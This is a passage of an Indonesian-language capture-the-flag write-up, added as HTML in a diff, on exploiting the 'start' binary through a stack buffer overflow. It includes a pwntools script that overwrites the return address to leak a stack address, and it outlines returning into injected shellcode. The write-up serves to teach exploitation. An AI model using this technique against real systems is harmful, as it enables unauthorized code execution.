+<h3 id="langkah-exploit-5">Langkah Exploit</h3>
+<p>Pertama, lakukan ritual dulu. Dengan command checksec, </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/HJXD42wZGe.png" alt="image"></p>
+<p>Nah, coba kita buka dengan Ghidra. Atau decompiler lain, tapi aku sendiri lebih prefer Ghidra.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SJ8gsjD-Mg.png" alt="image"></p>
+<p>Disini ga terlalu kelihatan ya code nya. Jadi aku coba buat liat dari gdb.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SyaJBnP-Ge.png" alt="image"></p>
+<p>Nah, dari gdb. Bisa dilihat jika program melakukan 2 kali <strong>syscall</strong>. Pertama <strong>syscall write</strong> dan yang kedua <strong>syscall read</strong>. </p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/Sk-trhDZzg.png" alt="image"></p>
+<p>Dari <strong>syscall read</strong>. Bisa dilihat max char nya adalah 0x3c atau <strong>60 byte</strong>. Dan jika di tes dengan menggunakan cyclic ternyata bisa dilakukan <strong>Buffer Overflow</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/B1qaH2PZze.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/SJm0S3Dbzg.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/BywZL2vWMg.png" alt="image"></p>
+<p>Nah, ternyata offset sampai ke RET adalah <strong>20 byte</strong>. Dan jika dilihat registernya:</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/SJ_QU3v-Mg.png" alt="image"></p>
+<p>ecx menyimpan address dari stack. Dari sini jika <strong>diubah RET</strong> nya ke bagian <strong>syscall write</strong>. Binary akan <strong>print address</strong> dari <strong>ecx</strong> which is <strong>stack address</strong>, karena <strong>syscall write</strong> akan menulis informasi dari <strong>ecx</strong>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/rJe2U2wWfx.png" alt="image"></p>
+<p><strong>Script Leak Address Stack</strong>:</p>
+<pre><code class="language-a">from pwn import *
+
+context.log_level = &#39;debug&#39; #debug / info / warning / error / critical / notset
+
+chall = &#39;./start&#39;
+p = process(chall)
+elf = context.binary = ELF(chall, checksec=False)
+
+gdb.attach(p, gdbscript=&#39;&#39;&#39;
+&#39;&#39;&#39;)
+
+payload = b&#39;\x90&#39; * 20
+payload += p32(0x08048087)
+p.recv()
+# sleep(10)
+p.sendline(payload)
+hasil = p.recv(4)
+print(hasil)
+hasilHex = enhex(hasil)
+print(&#39;mentah: &#39;,hasilHex)
+
+hasil = hex(u32(hasil))
+print(&#39;HEX: &#39;, hasil)
+hasil = int(hasil, 16) + 0x6c
+
+print(hex(hasil))
+p.interactive()
+</code></pre>
+<p>Nah, setelah melakukan leak <strong>address stack</strong>, Program masuk ke dalam <strong>syscall read</strong> lagi. Disini lakukan Buffer Overflow lagi dan RET ke stack, sekalian di paling akhir masukkan <strong>shellcode</strong>.
+Jadi <strong>input ke read</strong> nya:
+<strong>20 Byte sampah + Address Leak yang sudah di proses + shellcode</strong></p>
+<p>Address Leak yang di input harus menunjuk address dimana shellcode nya ada. Disini kalian bisa mainin gdb nya aja sampai dapat.
+<em>Hint: gunain x/i untuk melihat instruction dari stack nya</em>.</p>
+<p><img loading="lazy" decoding="async" src="/writeups/shellcoding/Skv25iDWGx.png" alt="image">
+<img loading="lazy" decoding="async" src="/writeups/shellcoding/HJQMoowZfl.png" alt="image"></p>
+
+</article>
